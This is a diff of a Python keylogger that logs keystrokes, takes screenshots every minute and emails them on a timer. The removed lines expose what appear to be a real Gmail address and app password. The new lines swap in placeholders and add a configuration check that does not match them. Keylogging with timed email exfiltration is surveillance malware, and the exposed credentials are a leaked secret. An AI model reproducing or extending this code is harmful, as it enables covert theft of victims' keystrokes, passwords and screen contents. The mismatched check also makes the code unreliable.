@@ -24,9 +24,9 @@ from datetime import datetime
 LOG_FILE = "keylog.txt"
 ENCRYPTED_LOG_FILE = "encrypted_log.txt"
 
-EMAIL_ADDRESS = "sheetanshkukrety@gmail.com"
-EMAIL_PASSWORD = "ssxb pzwn bfty leju"
-RECEIVER_EMAIL = "shanuwrites02@gmail.com"
+EMAIL_ADDRESS = "your_mail here"
+EMAIL_PASSWORD = "mail_password"
+RECEIVER_EMAIL = "receiver_email_here"
 
 EMAIL_INTERVAL = 300        # ✅ 5 minutes AFTER launch
 SCREENSHOT_INTERVAL = 60
@@ -63,8 +63,11 @@ def take_screenshot():
         return path
     except:
         return None
-
+        
 def send_email():
+    if "@" not in EMAIL_ADDRESS or EMAIL_PASSWORD == "mail password":
+        print("Email not configured. Skipping email send.")
+        return
     try:
         # ✅ FIX 1: force log flush so keystrokes are written
         for handler in logging.root.handlers:
